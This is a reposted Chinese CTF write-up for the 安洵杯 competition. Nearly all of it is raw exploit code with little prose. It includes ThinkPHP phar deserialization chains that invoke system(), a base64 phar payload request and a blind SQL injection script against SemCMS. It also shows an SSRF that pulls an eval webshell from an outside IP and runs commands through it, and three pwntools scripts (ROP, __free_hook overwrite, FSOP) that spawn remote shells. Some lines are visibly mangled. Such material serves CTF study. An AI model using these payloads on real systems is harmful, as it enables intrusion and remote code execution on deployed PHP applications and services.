# 安洵杯-WriteUp

> 原文: https://www.ctfiot.com/13958.html
> ID: 13958

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
<?php
namespace thinkprocesspipes{
    use thinkmodelPivot;
    class Windows{
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model{
        protected $append;
        private $data;
        function __construct(){
            $this->data = ['request'=>new Request()];
            $this->append = ['request' => ''];
            $this->append['request'] = array(
                'aa' => 'aaa'
            );
        }
    }
}
namespace thinkmodel{
    use thinkModel;
    use thinkRequest;
    class Pivot extends Model{
    }
}
namespace think{
    class Request{
        protected $hook;
        protected $param;
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook = ["visible"=>[$this,"isAjax"]];
            $this->param = ['dir'];
            $this->filter = array('1' => 'system','2' => '2');
        }
    }
}
namespace {
    use thinkprocesspipesWindows;
    $payload=new Windows();
    unlink("temp.phar");
    $phar = new Phar("temp.phar");
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($payload);
    $phar->addFromString('test.txt', 'Hello world!');
}
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["calc.exe","calc"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}
namespace thinkprocesspipes;

use thinkmodelconcernConversion;
use thinkmodelPivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace thinkmodel;

use thinkModel;

class Pivot extends Model
{
}
use thinkprocesspipesWindows;
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata(new Windows()); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

echo base64_encode(file_get_contents("phar.phar"));
get /index.php/index/index/hello?huha[]=cat+/y0u_f0und_It
pos 
world=hello%3dPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%25%32%62DQrGAQAAAQAAABEAAAABAAAAAACQAQAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czo4OiJjYWxjLmV4ZSI7aToxO3M6NDoiY2FsYyI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjU6ImV0aGFuIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQgAAAB0ZXN0LnR4dAQAAAC/3KFhBAAAAAx%25%32%62f9ikAQAAAAAAAHRlc3QgU3Sk6UFHPeqihUvXyWZJEhWeJwIAAABHQk1C%26a%3dphar://hello.txt
import requests
import time

s='abcdefghijklmnopqrstuvwxyz1234567890{}_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM'

url='http://47.108.195.119:
6244/Core/Program/Ant_Rponse.php?actions=ReviewsAdd&lgid=1&type=Add'

datas={'msg_rating':'4','msg_name':'okami okami','msg_email':'okami@okami.com','msg_content':'1111','msg_pid':'2','msg_flag':'p','languageID':'1'}

payload="1'+(if((ascii(substr((select(user_name)from(sc_user),{}))={}),sleep(3),0))+'1"

    #data='0b7752df93de693bdab0060746e38165'
    #admin888
    #admin888
data=''
for i in range(1,40):
 for a in s:
  payloads=payload.format(str(i),str(ord(a)))
  headers={'X-Forwarded-For':
payloads}
  print(headers)
  start = int(time.time())
  r=requests.post(url,data=datas,headers=headers)
  response_time = int(time.time()) - start
  if response_time >= 3:
   data+=a
   print('data: '+str(data))
   break
  else:
   print(r.text)
strpos($dname[2],'sem-cms.cn') !== false
http://sem-cms.cn@ip/
<?php
echo '<?php eval($_REQUEST[1]);var_dump("okk!");?>';
?>
http://47.108.195.119:
6244/CxWsbN_AR4/Ant_Curl.php?url=http://sem-cms.cn@101.35.90.76/okami.php
http://47.108.195.119:
6244/Soft/Zip/okami.php?1=system(%22cat%20/flag%22);
python3 crc32.py reverse 0xA430239A th1s_I
python3 crc32.py reverse 0xF81ABECD s_Y0ur
python3 crc32.py reverse 0x2A75B14E _pa33w
python3 crc32.py reverse 0x2D2C423C 0rd_We
python3 crc32.py reverse 0xD9E12803 1c0m3e
from functools import reduce

def Tuppers_Self_Referential_Formula():
    k = 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352

    def f(x, y):
        d = ((-17 * x) - (y % 17))
        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1
        g = ((y // 17) // e) % 2
        return 0.5 < g
    for y in range(k + 16, k - 1, -1):
        line = ""
        for x in range(0, 107):
            if f(x, y):
                line += " ■"
            else:
                line += "  "
        print(line)

if __name__ == '__main__':
    Tuppers_Self_Referential_Formula()
# -*- coding:
UTF-8 -*-
from pwn import *
from LibcSearcher import *
    #context.log_level = 'debug'

    #context
context.arch = 'amd64'
SigreturnFrame(kernel = 'amd64')

binary = "./ezstack"

global p

local = 0
if local:
    p = process(binary)
    elf = ELF(binary)
else:
    p = remote("47.108.195.119","20113")
    elf = ELF(binary)
    #libc = ELF(libc_file)

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
u64Leakbase = lambda offset :
u64(ru("x7f")[-6: ] + '  ') - offset
u32Leakbase = lambda offset :
u32(ru("xf7")[-4: ]) - offset
it      = lambda                    :p.interactive()

def dbg():
 gdb.attach(p)
 pause()

def lg(string,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(string,addr))

def first():
    p.sendline('Venom')
    sleep(1)
    p.sendline('Venom')
    sleep(1)

first()
payload = "Can:%11$pELF:%12$p"
    #dbg()
p.sendline(payload)
ru('Can:0x')
canary = int(rc(16),16)
ru('ELF:0x')
elf_base = int(rc(12),16) - 0xaa0
lg("canary",canary)
lg("elf_base",elf_base)
binsh_addr = elf_base + 0xb24
pop_rdi_ret = elf_base + 0xb03
payload = 'PIG007NB'*(0x18/8)
payload += p64(canary) + p64(0)
payload += p64(pop_rdi_ret) + p64(binsh_addr)
payload += p64(elf_base+0xa8c)
p.sendline(payload)
p.interactive()

    #d0g3{b992a129ef160e6581fc255f87c28d8f}
# -*- coding:
UTF-8 -*-
from pwn import *
from LibcSearcher import *
    #context.log_level = 'debug'

    #context
context.arch = 'amd64'
SigreturnFrame(kernel = 'amd64')

binary = "./noleak1"
context.timeout = 0.2

global p

local = 0
if local:
    p = process(binary)
    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={"LD_PRELOAD":"/glibc/2.24/64/lib/libc-2.24.so"})
    elf = ELF(binary)
    libc = ELF('./lib/libc.so.6')
else:
    p = remote("47.108.195.119","20182")
    libc = ELF('./lib/libc.so.6')
    elf = ELF(binary)

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
u64Leakbase = lambda offset :
u64(ru("x7f")[-6: ] + '  ') - offset
u32Leakbase = lambda offset :
u32(ru("xf7")[-4: ]) - offset
it      = lambda                    :p.interactive()

menu = "> "

def first():
    p.sendline('Venom')
    p.sendline('Venom')

def dockerDbg():
 myGdb = remote("127.0.0.1",30001)
 myGdb.close()
 pause()

def dbg():
 gdb.attach(p)
 pause()

def lg(string,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(string,addr))

def add(idx,size):
 sla(menu, "1")
 sla("Index?n", str(idx))
 sla("Size?n", str(size))

def show(idx):
 sla(menu, "2")
 sla("Index?n", str(idx))

def edit(idx,con):
 sla(menu, "3")
 sla("Index?n", str(idx))
 sla("content:n", con)

def delete(idx):
 sla(menu, "4")
 sla("Index?n", str(idx))

first()

ru("please input a str:")
pl = 'N0_py_1n_tHe_ct7'
sd(pl)

for i in range(0x7):
 add(i,0xf8)

add(7,0xf8)
add(8,0x78)
add(9,0xf8)

for i in range(0x7):
 delete(i)

for i in range(0x7):
 add(i,0x68)
for i in range(0x7):
 delete(i)

delete(7)
edit(8,"PIG007NB"*(0x70/8)+p64(0x100+0x80))
    #dbg()
delete(9)

for i in range(0x7):
 add(0,0xf8)

add(0,0xf8)
add(0,0x28)
add(1,0x28)
add(2,0x28)
    #dbg()
show(0)

libc_base = u64Leakbase(0x3afca0)
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

lg("libc_base",libc_base)
lg("system_addr",system_addr)
lg("free_hook",free_hook)

delete(2)
delete(1)
delete(0)
    #dbg()
edit(8,p64(free_hook))
add(0,0x28)
add(1,0x28)
edit(8,'/bin/shx00')
edit(1,p64(system_addr))
delete(8)
it()

    #d0g3{dc8e8748ce4a44bfcaf268526cd5b084}
# -*- coding:
UTF-8 -*-
from pwn import *
from LibcSearcher import *
    #context.log_level = 'debug'

context.arch = 'amd64'
SigreturnFrame(kernel = 'amd64')

binary = "./pwn"

local = 0
if local:
    p = process(binary)
    elf = ELF(binary)
    #libc = ELF('./libc.so.6')
    libc = ELF("~/glibc/2.23/64/lib/libc.so.6")
else:
    p = remote("47.108.195.119","20141")
    libc = ELF('./libc.so.6')

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
u64Leakbase = lambda offset :
u64(ru("x7f")[-6: ] + '  ') - offset
u32Leakbase = lambda offset :
u32(ru("xf7")[-4: ]) - offset
it      = lambda                    :p.interactive()

menu = "Your choice : "

def first():
    p.sendline('Venom')
    p.sendline('Venom')

def dockerDbg():
 myGdb = remote("127.0.0.1",30001)
 myGdb.close()
 pause()

def dbg():
 gdb.attach(p)
 pause()

def lg(string,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(string,addr))

def add(size, con):
 sla(menu, "1")
 sla("size of itn", str(size))
 sa("Name?", con)

def edit(size, con):
 sla(menu, "2")
 sla("size of itn", str(size))
 sa("namen", con)

def show():
 sla(menu, "3")

first()
ru('0x')
heap_base = int(rc(12),16) - 0x10
lg("heap_base",heap_base)

    #change top_chunk size
add(0x28,'PIG007NB')
edit(0x30,'PIG007NB'*(0x28/8)+p64(0x0fb1))

    #set top_chunk into unsortedbin
add(0xff8,'PIG007NB')

add(0x48,'PIG007NB')
    #dbg()
show()
libc_base = u64Leakbase(0x10 + 1640 + libc.sym['__malloc_hook'])
    #global_max_fast = libc_base + libc.sym['global_max_fast']
main_arena_addr = libc_base + libc.sym['__malloc_hook'] + 0x10
_IO_list_all_addr = libc_base + libc.sym['_IO_list_all']
system_addr = libc_base + libc.sym['system']
    #lg("global_max_fast",global_max_fast)
lg("libc_base",libc_base)
lg("main_arena_addr",main_arena_addr)
lg("_IO_list_all_addr",_IO_list_all_addr)
lg("system_addr",system_addr)

    #set into 0x60 smallBin
fake_IO_all_list = '/bin/shx00'.ljust(8,'x00')+p64(0x60)

    #unsorted bin attack
fake_IO_all_list += p64(0)+p64(_IO_list_all_addr-0x10)

#IO_write_ptr>IO_write_base
fake_IO_all_list += p64(0)+p64(1)

    #mode=0
fake_IO_all_list = fake_IO_all_list.ljust(0xc0,'x00')

payload = 'PIG007NB'*(0x40/8)
payload += fake_IO_all_list
payload += p64(0)*3+p64(heap_base + 0x178)
payload += 'PIG007NB'*(0x10/8)
payload += p64(system_addr)

    #dbg()
edit(len(payload),payload)
ru(": ")
sl('1')
it()

    #d0g3{0fd0b03b98418bb30c7c96b2b6ba9347}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/6-1638148567.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/5-1638148568.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/9-1638148568.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/9-1638148568-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/4-1638148569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/6-1638148569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/0-1638148569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/8-1638148569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/5-1638148570.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/11/9-1638148570.png)